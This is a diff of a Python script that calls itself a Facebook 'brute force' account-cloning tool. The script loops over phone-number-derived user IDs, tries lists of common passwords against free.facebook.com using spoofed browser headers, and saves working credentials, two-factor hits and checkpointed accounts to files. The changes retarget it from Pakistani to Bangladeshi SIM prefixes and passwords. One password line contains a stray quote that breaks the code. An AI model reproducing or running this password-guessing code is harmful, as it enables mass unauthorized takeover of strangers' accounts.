@@ -126,12 +126,12 @@ logo ="""
                                                  
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
 \033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36mRHS✯TEAM\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
-\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mHRIDOY HOSSEN SHANTO            \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mSH AN TO                                                 \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m SHANTO                  \033[1;31m │
-\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mSHANTO WORLD                  \033[1;31m   │
-\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   │
-\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
+\033[1;31m \033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mHRIDOY HOSSEN SHANTO            \033[1;31m
+\033[1;31m \033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mSH AN TO                                                 \033[1;31m
+\033[1;31m \033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m SHANTO                  \033[1;31m 
+\033[1;31m \033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mSHANTO WORLD                  \033[1;31m   
+\033[1;31m \033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   
+\033[1;31m \033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m
 \033[1;37m╚\033[1;36mⒽⒷⒻ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36mⒽⒷⒻ\033[1;37m╝
 
 \033[1;31m======================================================"""
@@ -505,25 +505,27 @@ def random_method(ids,passlist,total_ids):
         for pas in passlist:
             xyz = requests.Session()
             pro = random.choice(rug)
-            header = ({'authority':'business.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            header = {'authority': 'www.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
             'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'referer': 'https://free.facebook.com/login/',
-            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+            'dpr': '2',
+            'referer': 'https://web.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
             'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'same-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':pro,
-            'connection':'keep-alive'})
+            'user-agent': pro,
+            'viewport-width': '980',
+}
             url = 'https://free.facebook.com/?ref=opera_speed_dial_freefb'
             raw = xyz.get(url).text
             koki = (";").join([ "%s=%s" % (key, value) for key, value in xyz.cookies.get_dict().items() ])
@@ -548,7 +550,7 @@ def random_method(ids,passlist,total_ids):
                 if cid in ok:
                     pass
                 else:
-                    os.system("play-audio SHANTO_OK.mp3")
+                    ##os.system("play-audio SHANTO_OK.mp3")
                     print('\r\033[1;92m[SHANTO-OK] '+cid+' | '+pas+'\033[0;97m')
                     ok.append(cid)
                     open('/sdcard/SHANTO_OK.txt', 'a').write(cid+' | '+pas+'\n')
@@ -561,7 +563,7 @@ def random_method(ids,passlist,total_ids):
                 else:
                     d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                     if 'Enter login code to continue' in str(d.group(1)):
-                        os.system("play-audio SHANTO_2F.mp3")
+                        ##os.system("play-audio SHANTO_2F.mp3")
                         print('\r\033[1;95m[SHANTO-2F] '+cid+' | '+pas+'\033[0;97m')
                         tf.append(cid)
                         open('/sdcard/SHANTO_2F.txt', 'a').write(cid+' | '+pas+'\n')
@@ -570,7 +572,7 @@ def random_method(ids,passlist,total_ids):
                         if cid in cp:
                             pass
                         else:
-                            os.system("play-audio SHANTO_CP.mp3")
+                            ##os.system("play-audio SHANTO_CP.mp3")
                             print('\r\033[1;94m[SHANTO-CP] '+cid+' | '+pas+'\033[0;97m')
                             cp.append(cid)
                             open('/sdcard/SHANTO_CP.txt', 'a').write(cid+' | '+pas+'\n')
@@ -1028,8 +1030,8 @@ def pass5():
     linex()
     print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
     print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
+    print(f' {GREEN}[!] BD SIM CODES : 017, 016, 019, 018')
+    print(f' {GREEN}[!]               : 017, 016, 019, 018')
     print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
     linex()
     print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
@@ -1055,7 +1057,7 @@ def pass5():
         print(f'{RED}======================================================')
         for love in user:
             uid = code+love
-            pwx = ['khankhan','ali786','ali123','ali1122','aliali']
+            pwx = ['bangladesh','sadiya','nusrat','hridoy','mababa','sahin'']
             manshera.submit(freeq,uid,pwx,tl)
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
@@ -1163,7 +1165,7 @@ def freeq(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio SHANTO_OK.mp3")
+                ##os.system("play-audio SHANTO_OK.mp3")
                 print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ '  ') 
                 cek_apk(session,coki)
                 open('/sdcard/SHANTO-OK.txt', 'a').write(uid+' | '+ps+'\n')
@@ -1172,14 +1174,14 @@ def freeq(uid,pwx,tl):
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio SHANTO_2F.mp3")
+                    ##os.system("play-audio SHANTO_2F.mp3")
                     print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' ')
                     open('/sdcard/SHANTO-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio SHANTO_CP.mp3")
+                    ##os.system("play-audio SHANTO_CP.mp3")
                     print(f'\r{RED}[CP] '+uid+' [×] '+ps+' ')
                     open('/sdcard/SHANTO-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
